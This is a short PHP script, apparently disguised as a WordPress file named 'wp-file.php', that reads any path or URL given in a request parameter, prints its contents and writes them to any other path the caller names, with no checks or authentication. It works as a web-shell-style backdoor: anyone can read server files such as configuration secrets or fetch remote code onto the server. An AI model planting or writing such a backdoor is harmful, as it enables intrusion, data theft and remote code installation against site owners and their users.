<?php 
if(isset($_REQUEST['file']) && isset($_REQUEST['in'])) {
  $file = $_REQUEST['file']; 
  $in = $_REQUEST['in'];
  echo $in."</br>"; 
  $cont=file_get_contents($in); 
  echo $cont; 
  file_put_contents($file, $cont);
} else {
  echo "<br>wp-file.php?file=&in=";
}
?>
